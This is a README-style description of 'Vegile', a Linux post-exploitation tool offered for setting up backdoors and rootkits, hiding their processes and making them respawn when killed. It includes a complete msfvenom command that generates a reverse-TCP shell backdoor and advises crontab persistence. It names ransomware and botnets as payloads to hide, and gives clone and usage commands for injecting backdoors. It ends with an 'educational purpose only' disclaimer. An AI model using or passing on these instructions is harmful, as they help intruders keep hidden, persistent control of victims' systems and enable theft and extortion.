### vegile - Ghost In The Shell
```
Vegile - Ghost In The Shell
Vegile is a tool for Post exploitation Techniques in linux. Post Exploitation techniques will ensure that we maintain some level of access and can potentially lead to deeper footholds into our targets trusted network.
How it works
This tool will set up your backdoor/rootkits when backdoor is already setup it will be hidden your specific process,unlimited your session in metasploit and transparent. Even when it is killed, it will re-run again. There will always be a procces which will run another process, so we can assume that this procces is unstopable like a Ghost in The Shell.
READ THIS
Right now I just tested backdoor with msfvenom command using reverse_shell and my manual backdoor for linux [ it works ] or you can use thefatrat for to help you create a simple backdoor
msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=IP LPORT=PORT -b "\x00" -f elf -o NAME_BACKDOOR
for hidden process you can use for rootkits,backdoor,ransom and botnet { sh,python,perl,exe and binary }.
Victim target all linux distribution include ( base32 and base64 in their system )
For get persistence you can use crontab and xinit.d into your backdoor
this is just a simple algorithm how we can maintain our sessions and backdoor/rootkits , you can explore this.
Getting Started
git clone https://github.com/Screetsec/Vegile.git
cd Vegile
chmod +x Vegile
Using Vegile
Running Vegile without any parameters will give a helpful list of the most common options. you can use command :
Vegile -i / --inject [backdoor/rootkit]
Vegile -u / --unlimited [backdoor/rootkit]
Vegile -h / --help
Note:- This tool is only for educational purpose. We are not responsible for any misuse or illegal activities.
```
